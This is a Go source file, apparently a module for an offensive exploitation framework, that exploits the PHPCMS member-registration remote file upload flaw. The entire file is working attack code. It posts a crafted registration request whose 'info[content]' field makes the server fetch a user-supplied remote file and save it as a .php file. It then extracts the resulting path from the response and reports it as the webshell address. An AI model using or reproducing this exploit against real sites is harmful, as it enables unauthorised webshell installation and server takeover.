package exp_phpcms

import (
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"

	"net/url"
	"regexp"
	"strings"
)

type Exp_PHPcms_Upload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_PHPcms_Upload) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	// 默认配置
	headers := self.GetInitExpHeaders()

	// url
	target := ""
	if strings.Contains(strings.ToLower(self.Params.BaseParam.Target), "?m=member") {
		target = self.Params.BaseParam.Target
	} else {
		target = strings.TrimSuffix(self.Params.BaseParam.Target, "?") + "?m=member&c=index&a=register&siteid=1"
	}

	// 构造payload
	randStr := goutils.RandStr(8)
	payload := "siteid=1&modelid=11&username=" + randStr + "&password=cp" + randStr + "&email=" + randStr + "@163.com&info%5Bcontent%5D=src%3d" + url.QueryEscape(filename) + "%3f.php%23.jpg&dosubmit=1&protocol="
	headers["Content-Type"] = []string{"application/x-www-form-urlencoded"}

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	result := regexp.MustCompile(`['"]src=(.*?)['"]`).FindStringSubmatch(httpresp.Body)
	if len(result) > 0 {
		self.EchoSuccessMsg("shell地址: %s", result[1])
		expResult.Status = true
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_PHPcms_Upload{}, "exp_phpcms_upload.yml")
}
